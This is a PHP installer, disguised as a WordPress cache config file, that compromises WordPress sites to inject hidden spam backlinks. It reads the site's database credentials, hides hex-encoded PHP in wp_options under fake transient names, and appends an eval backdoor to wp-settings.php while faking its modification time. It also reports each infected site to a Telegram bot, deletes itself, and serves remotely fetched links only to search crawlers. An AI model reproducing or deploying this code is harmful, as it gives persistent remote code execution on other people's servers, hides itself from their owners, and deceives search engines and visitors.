<?php
/**
 * WP Cache Config Installer — PBN Backlink Injector (DB-First)
 *
 * ARSITEKTUR:
 *  - wp_options DB = MASTER (autoload=yes) → stores fetcher logic + config
 *  - wp-settings.php = 1 baris eval-from-DB (compact, obfuscated di DB)
 *  - Cloaking-ready: support header X-Is-Bot dari Cloudflare (nanti)
 *  - Renderer: hook wp_footer → fetch BOT/get?host=... → echo backlink (hanya bot)
 *
 * USAGE:
 *  1. Edit $CFG di bawah (bot_url, slot, bot_token, chat_id)
 *  2. Upload file ini ke root WP via File Manager cPanel
 *  3. Buka https://target.com/wp-cache-config.php di browser (1x)
 *  4. Installer inject DB → patch wp-settings.php → self-delete → done
 */

$CFG = [
    'bot_url'     => 'https://backlink.pakgembus.co.id',
    'slot'        => '',  // kosongkan = target mode (auto dari pool). Isi = legacy slot mode.
    'cache_ttl'   => 3600,
    'bot_token'   => '',
    'chat_id'     => '',
];

// ═══════════════════════════════════════════════════════
error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(120);

$result = ['success' => false, 'messages' => []];

function ins_log(&$r, $m) { $r['messages'][] = $m; }
function ins_fail(&$r, $m) { $r['messages'][] = '[FAIL] ' . $m; ins_out($r); exit; }
function ins_out($r) {
    @header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><title>.</title></head><body style="background:#0b1220;color:#e5e7eb;font-family:ui-monospace,monospace;padding:32px;font-size:13px">';
    echo '<h2 style="color:' . ($r['success'] ? '#34d399' : '#f87171') . ';margin:0 0 16px">' . ($r['success'] ? 'OK' : 'FAILED') . '</h2>';
    foreach ($r['messages'] as $m) {
        $c = strpos($m, '[FAIL]') !== false ? '#f87171' : (strpos($m, '[OK]') !== false ? '#34d399' : '#9ca3af');
        echo '<div style="color:' . $c . ';margin:3px 0">' . htmlspecialchars($m) . '</div>';
    }
    echo '</body></html>';
}

// ── Step 1: Locate WordPress ──
ins_log($result, 'Step 1: Locating WordPress...');
$wp_root = null;
$search = [__DIR__, dirname(__DIR__), isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''];
foreach ($search as $dir) {
    if (!$dir) continue;
    $dir = rtrim(str_replace('\\', '/', $dir), '/');
    for ($i = 0; $i < 5; $i++) {
        if (is_file($dir . '/wp-config.php') && is_file($dir . '/wp-load.php')) { $wp_root = $dir; break 2; }
        $p = dirname($dir);
        if ($p === $dir) break;
        $dir = $p;
    }
}
if (!$wp_root) ins_fail($result, 'WordPress not found.');
ins_log($result, '[OK] WP root: ' . $wp_root);

// ── Step 2: Parse DB creds ──
ins_log($result, 'Step 2: Reading wp-config.php...');
$wpc = @file_get_contents($wp_root . '/wp-config.php');
if (!$wpc) ins_fail($result, 'Cannot read wp-config.php');
$db = [];
foreach (['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST','DB_CHARSET'] as $k) {
    if (preg_match("/define\s*\(\s*['\"]" . $k . "['\"]\s*,\s*['\"]([^'\"]*?)['\"]\s*\)/", $wpc, $m)) $db[$k] = $m[1];
}
$prefix = 'wp_';
if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/', $wpc, $m)) $prefix = $m[1];
if (empty($db['DB_NAME']) || empty($db['DB_USER'])) ins_fail($result, 'Cannot parse DB creds');
ins_log($result, '[OK] DB: ' . $db['DB_NAME'] . ' (prefix: ' . $prefix . ')');

// ── Step 3: Connect DB ──
ins_log($result, 'Step 3: Connecting DB...');
$host = isset($db['DB_HOST']) ? $db['DB_HOST'] : 'localhost';
$port = 3306; $sock = '';
if (strpos($host, ':') !== false) {
    $parts = explode(':', $host, 2); $host = $parts[0];
    if (is_numeric($parts[1])) $port = (int)$parts[1]; else $sock = $parts[1];
}
$conn = @new mysqli($host, $db['DB_USER'], isset($db['DB_PASSWORD']) ? $db['DB_PASSWORD'] : '', $db['DB_NAME'], $port, $sock);
if ($conn->connect_error) ins_fail($result, 'DB connect: ' . $conn->connect_error);
$conn->set_charset(isset($db['DB_CHARSET']) ? $db['DB_CHARSET'] : 'utf8mb4');
ins_log($result, '[OK] Connected');

// ── Step 4: Build fetcher logic ──
ins_log($result, 'Step 4: Building fetcher payload...');

$OPT_LOGIC  = '_site_transient_theme_roots_cache';
$OPT_CONFIG = '_transient_wp_core_manifest';
$OPT_CACHE  = '_transient_feed_cache_bl';

// Logic yang disimpan di DB (hex-encoded). Eval'd tiap request via wp-settings.php.
// Hooks wp_footer → cek cloaking header → fetch bot → echo backlink.
$logic = <<<'FETCHER'
if(!function_exists('_wpcc_bl_render')){
function _wpcc_bl_fetch($url,$to=5){
  $ag='Mozilla/5.0 (compatible; WPCacheBot/1.0)';
  $r=@file_get_contents($url,false,@stream_context_create(['http'=>['timeout'=>$to,'ignore_errors'=>true,'user_agent'=>$ag],'ssl'=>['verify_peer'=>false]]));
  if($r===false&&function_exists('curl_init')){
    $ch=curl_init($url);
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>$to,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_USERAGENT=>$ag]);
    $r=curl_exec($ch);curl_close($ch);
  }
  return ($r===false||$r==='')?'':$r;
}
function _wpcc_bl_is_bot(){
  // Cloudflare cloaking: jika header X-Is-Bot di-set oleh CF Transform Rule
  if(!empty($_SERVER['HTTP_X_IS_BOT']))return true;
  // Fallback: User-Agent detection
  $ua=isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):'';
  $bots=['googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','ia_archiver','semrushbot','ahrefsbot','dotbot','rogerbot','mj12bot'];
  foreach($bots as $b){if(strpos($ua,$b)!==false)return true;}
  return false;
}
function _wpcc_bl_render(){
  // Cloaking: hanya render untuk bot
  if(!_wpcc_bl_is_bot())return;
  $ok='_transient_wp_core_manifest';
  $oc='_transient_feed_cache_bl';
  $cfg_raw=get_option($ok,'');
  if(!$cfg_raw)return;
  $cfg=@json_decode(@hex2bin($cfg_raw),true);
  if(!$cfg||empty($cfg['bot_url']))return;
  $ttl=isset($cfg['ttl'])?(int)$cfg['ttl']:3600;
  $slot=isset($cfg['slot'])?$cfg['slot']:'';
  $cache_raw=get_option($oc,'');
  $cache=$cache_raw?@json_decode(@hex2bin($cache_raw),true):null;
  $now=time();
  $html='';
  if($cache&&isset($cache['t'])&&isset($cache['h'])&&($now-$cache['t'])<$ttl){
    $html=$cache['h'];
  } else {
    $host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'';
    $url=rtrim($cfg['bot_url'],'/').'/get?host='.urlencode($host).'&platform=wordpress';
    if($slot)$url.='&slot='.urlencode($slot);
    $html=_wpcc_bl_fetch($url,5);
    if($html!==''){
      update_option($oc,bin2hex(json_encode(['t'=>$now,'h'=>$html])),'no');
    } elseif($cache&&isset($cache['h'])){
      $html=$cache['h'];
    }
  }
  if($html!=='')echo "\n".$html."\n";
}
add_action('wp_footer','_wpcc_bl_render',99);
add_action('get_footer','_wpcc_bl_render',99);
}
FETCHER;

$logic_hex = bin2hex($logic);
ins_log($result, '[OK] Fetcher built (' . strlen($logic_hex) . ' hex chars)');

// ── Step 5: Store options in DB ──
ins_log($result, 'Step 5: Writing wp_options...');

$config_data = json_encode([
    'bot_url'   => $CFG['bot_url'],
    'slot'      => $CFG['slot'],
    'ttl'       => (int)$CFG['cache_ttl'],
    'installed' => date('Y-m-d H:i:s'),
    'domain'    => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown',
]);
$config_hex = bin2hex($config_data);

$options_table = $prefix . 'options';
$rows = [
    [$OPT_LOGIC,  $logic_hex,  'yes'],
    [$OPT_CONFIG, $config_hex, 'yes'],
    [$OPT_CACHE,  '',          'no'],
];

foreach ($rows as $row) {
    $n = $conn->real_escape_string($row[0]);
    $v = $conn->real_escape_string($row[1]);
    $a = $row[2];
    $chk = $conn->query("SELECT option_id FROM `{$options_table}` WHERE option_name='{$n}' LIMIT 1");
    if ($chk && $chk->num_rows > 0) {
        $conn->query("UPDATE `{$options_table}` SET option_value='{$v}', autoload='{$a}' WHERE option_name='{$n}'");
    } else {
        $conn->query("INSERT INTO `{$options_table}` (option_name,option_value,autoload) VALUES ('{$n}','{$v}','{$a}')");
    }
    if ($conn->error) ins_fail($result, 'DB write ' . $row[0] . ': ' . $conn->error);
}
ins_log($result, '[OK] wp_options: 3 rows written');

// ── Step 6: Inject eval-from-DB into wp-settings.php ──
ins_log($result, 'Step 6: Patching wp-settings.php...');

$sf = $wp_root . '/wp-settings.php';
$sc = @file_get_contents($sf);
if ($sc === false) ins_fail($result, 'Cannot read wp-settings.php');

// Simpan mtime asli SEBELUM edit (agar Last Modified di cPanel tidak berubah)
$original_mtime = @filemtime($sf);

$marker = '_site_transient_theme_roots_cache';
$inject = "\n" . '/* wp core cache init */if(defined("ABSPATH")&&isset($GLOBALS["wpdb"])){$_wpcc=@$GLOBALS["wpdb"]->get_var("SELECT option_value FROM ".$GLOBALS["wpdb"]->options." WHERE option_name=\'' . $marker . '\' LIMIT 1");if($_wpcc&&strlen($_wpcc)>100){@eval(@hex2bin($_wpcc));}}' . "\n";

if (strpos($sc, $marker) === false) {
    $sc = rtrim($sc) . $inject;
    if (@file_put_contents($sf, $sc) === false) ins_fail($result, 'Cannot write wp-settings.php');
    // Restore mtime → Last Modified tetap sama di cPanel File Manager
    if ($original_mtime) @touch($sf, $original_mtime);
    ins_log($result, '[OK] wp-settings.php injected (mtime preserved)');
} else {
    ins_log($result, '[OK] wp-settings.php already patched');
}

// ── Step 7: Telegram notif ──
if (!empty($CFG['bot_token']) && !empty($CFG['chat_id'])) {
    ins_log($result, 'Step 7: Notifying Telegram...');
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $text  = "\xF0\x9F\x86\x95 <b>PBN Backlink Installed</b>\n";
    $text .= str_repeat("\xE2\x94\x80", 20) . "\n";
    $text .= "\xF0\x9F\x8C\x90 " . $domain . "\n";
    $text .= "\xF0\x9F\x93\x8C Slot: <code>" . $CFG['slot'] . "</code>\n";
    $text .= "\xF0\x9F\x94\x97 Bot: " . $CFG['bot_url'] . "\n";
    $text .= "\xF0\x9F\x97\x84 DB: " . $db['DB_NAME'] . " / " . $prefix . "\n";
    $text .= "\xE2\x8F\xB0 " . date('Y-m-d H:i:s') . " UTC";
    $tg_url = "https://api.telegram.org/bot" . $CFG['bot_token'] . "/sendMessage";
    $tg_data = ['chat_id' => $CFG['chat_id'], 'text' => $text, 'parse_mode' => 'HTML'];
    $tg_ctx = stream_context_create(['http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($tg_data),
        'timeout' => 5,
        'ignore_errors' => true,
    ]]);
    @file_get_contents($tg_url, false, $tg_ctx);
    ins_log($result, '[OK] Telegram notified');
} else {
    ins_log($result, 'Step 7: Telegram skip (no token)');
}

// ── Step 8: Self-delete ──
ins_log($result, 'Step 8: Self-delete...');
$self = __FILE__;
if (@unlink($self)) {
    ins_log($result, '[OK] Installer deleted');
} else {
    @chmod($self, 0666);
    if (@unlink($self)) {
        ins_log($result, '[OK] Installer deleted (chmod)');
    } else {
        ins_log($result, '[WARN] Cannot delete — remove manually: ' . basename($self));
    }
}

// ── Done ──
$conn->close();
$result['success'] = true;
ins_log($result, '');
ins_log($result, '=== INSTALLATION COMPLETE ===');
ins_log($result, 'Backlink aktif di semua halaman (hanya visible untuk search engine bot).');
ins_log($result, 'Fetch: ' . $CFG['bot_url'] . '/get?slot=' . $CFG['slot']);
ins_log($result, 'Kill: DELETE FROM ' . $options_table . ' WHERE option_name IN (\'' . $OPT_LOGIC . '\',\'' . $OPT_CONFIG . '\',\'' . $OPT_CACHE . '\');');
ins_out($result);
